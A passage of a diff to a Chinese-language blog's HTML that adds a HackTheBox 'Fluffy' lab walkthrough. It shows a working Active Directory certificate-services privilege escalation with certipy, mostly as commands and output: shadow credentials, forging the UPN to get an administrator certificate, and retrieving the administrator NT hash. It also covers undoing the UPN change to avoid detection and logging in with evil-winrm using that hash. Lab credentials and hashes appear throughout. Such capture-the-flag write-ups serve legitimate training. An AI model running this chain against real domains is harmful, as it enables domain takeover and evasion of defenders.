+[*]     No identities found in this certificate
+[*] Using principal: &#39;ca_svc@fluffy.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;ca_svc.ccache&#39;
+[*] Wrote credential cache to &#39;ca_svc.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;ca_svc&#39;
+[*] Restoring the old Key Credentials for &#39;ca_svc&#39;
+[*] Successfully restored the old Key Credentials for &#39;ca_svc&#39;
+[*] NT hash for &#39;ca_svc&#39;: ca0f4f9e9eb8a092addf53bb03fc98c8
+
+export KRB5CCNAME=ca_svc.ccache 指定文件
+</code></pre><p>4：以 <code>ca_svc</code> 身份（伪装成 <code>administrator</code>）申请证书</p>
+<ul>
+<li><code>-k</code> 表示使用 Kerberos 票据（即 <code>ca_svc.ccache</code>）认证；</li>
+<li>向 <code>fluffy-DC01-CA</code> 证书服务器申请 <code>User</code> 模板证书：由于 <code>ca_svc</code> 的 UPN 已改为 <code>administrator</code>，CA 会误认为是 <code>administrator</code> 申请证书，最终颁发包含 <code>administrator</code> 身份的证书（如 <code>administrator.pfx</code>）；</li>
+<li><code>User</code> 模板通常允许导出私钥，这是后续认证的关键。</li>
+</ul>
+<pre tabindex="0"><code>certipy req -k -dc-ip &#39;10.10.11.69&#39; -target &#39;DC01.FLUFFY.HTB&#39; -ca &#39;fluffy-DC01-CA&#39; -template &#39;User&#39;
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[*] Requesting certificate via RPC
+[*] Request ID is 15
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;administrator&#39;
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to &#39;administrator.pfx&#39;
+[*] Wrote certificate and private key to &#39;administrator.pfx&#39;
+</code></pre><p>5：用途：将 <code>ca_svc</code> 的 UPN 还原为原始值</p>
+<ul>
+<li>攻击完成后清理痕迹，避免管理员发现 <code>ca_svc</code> 的 UPN 被篡改；</li>
+<li>若不还原，可能触发日志告警或被安全工具检测。</li>
+</ul>
+<pre tabindex="0"><code>certipy account -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -dc-ip &#39;10.10.11.69&#39; -upn &#39;ca_svc@fluffy.htb&#39; -user &#39;ca_svc&#39; update
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Updating user &#39;ca_svc&#39;:
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated &#39;ca_svc&#39;
+</code></pre><p>6：使用 <code>administrator.pfx</code> 证书认证为域管理员</p>
+<ul>
+<li>通过第 5 步申请的 <code>administrator.pfx</code> 证书（包含私钥）进行 Kerberos 认证；</li>
+<li>成功后可获取 <code>administrator</code> 的 NT 哈希或 TGT 票据，直接登录域控或其他高权限资源（如通过 <code>evil-winrm</code> 远程控制域控）。</li>
+</ul>
+<pre tabindex="0"><code>certipy auth -dc-ip &#39;10.10.11.69&#39; -pfx &#39;administrator.pfx&#39; -username &#39;administrator&#39; -domain &#39;fluffy.htb&#39;
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;administrator&#39;
+[*] Using principal: &#39;administrator@fluffy.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;administrator.ccache&#39;
+[*] Wrote credential cache to &#39;administrator.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;administrator&#39;
+[*] Got hash for &#39;administrator@fluffy.htb&#39;: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+</code></pre><p>evil登录拿到ROOT</p>
+<p>evil-winrm -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e -i 10.10.11.69</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/ad.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">整体攻击逻辑（核心链） 
+    <div id="整体攻击逻辑核心链" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%95%b4%e4%bd%93%e6%94%bb%e5%87%bb%e9%80%bb%e8%be%91%e6%a0%b8%e5%bf%83%e9%93%be" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li><strong>权限准备</strong>：<code>p.agila</code> 需对 <code>ca_svc</code> 有 <code>GenericWrite</code> 或 <code>WriteProperty</code> 权限（用于修改 UPN 和添加影子凭据）；</li>
+<li><strong>身份伪装</strong>：修改 <code>ca_svc</code> 的 UPN 为 <code>administrator</code>，欺骗 CA 服务器；</li>
+<li><strong>凭据注入</strong>：为 <code>ca_svc</code> 添加影子凭据，获取认证用的 Kerberos 票据；</li>
+<li><strong>证书申请</strong>：利用伪装身份和影子凭据，申请 <code>administrator</code> 的高权限证书；</li>
+<li><strong>权限提升</strong>：用证书认证为 <code>administrator</code>，实现域管理员权限接管；</li>
+<li><strong>痕迹清理</strong>：还原 <code>ca_svc</code> 的 UPN，降低被发现的概率。</li>
+</ol>
+
           
           
           
@@ -1057,9 +1254,9 @@ export PATH=/tmp:$PATH 追加`/tmp`到 PATH 最前，保留原有路径
   class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
   <a
     
-  href="/posts/fluffy-htb-w/"
+  href="/posts/editor-htb/"
     class="absolute inset-0"
-    aria-label="fluffy-htb"></a>
+    aria-label="Editor-htb"></a>
       
     
         
@@ -1072,7 +1269,7 @@ export PATH=/tmp:$PATH 追加`/tmp`到 PATH 最前，保留原有路径
     
       <div
         class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        fluffy-htb
+        Editor-htb
       </div>
     
     <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
@@ -1123,7 +1320,7 @@ export PATH=/tmp:$PATH 追加`/tmp`到 PATH 最前，保留原有路径
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-09-02T00:00:00&#43;00:00">2 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>930 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
+      <time datetime="2025-09-02T00:00:00&#43;00:00">2 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>260 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
     
 
     
@@ -1147,21 +1344,11 @@ export PATH=/tmp:$PATH 追加`/tmp`到 PATH 最前，保留原有路径
         
           
             
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/windows/"
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/xwiki/"
                 ><span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Windows
-  </span>
-</span>
-</a
-              >
-            
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/esc16/"
-                ><span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    ESC16
+    Xwiki
   </span>
 </span>
 </a
@@ -1696,8 +1883,8 @@ export PATH=/tmp:$PATH 追加`/tmp`到 PATH 最前，保留原有路径
           type="text/javascript"
           src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
           integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
-          data-oid="views_posts\editor-htb.md"
-          data-oid-likes="likes_posts\editor-htb.md"></script>
+          data-oid="views_posts\fluffy-htb-w.md"
+          data-oid-likes="likes_posts\fluffy-htb-w.md"></script>
       
     </section>
 
@@ -1713,7 +1900,7 @@ export PATH=/tmp:$PATH 追加`/tmp`到 PATH 最前，保留原有路径
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/fluffy-htb-w/">
+            <a class="flex group mr-3" href="/posts/k8s3/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1724,11 +1911,11 @@ export PATH=/tmp:$PATH 追加`/tmp`到 PATH 最前，保留原有路径
               >
               <span class="flex flex-col">
                 <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >fluffy-htb</span
+                  >K8s-3-靶场渗透</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-09-02T00:00:00&#43;00:00">2 September 2025</time>
+                    <time datetime="2025-08-31T00:00:00&#43;00:00">31 August 2025</time>
                   
                 </span>
               </span>
@@ -1736,6 +1923,27 @@ export PATH=/tmp:$PATH 追加`/tmp`到 PATH 最前，保留原有路径
           
         </span>
         <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/editor-htb/">
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Editor-htb</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-09-02T00:00:00&#43;00:00">2 September 2025</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
           
         </span>
       </div>
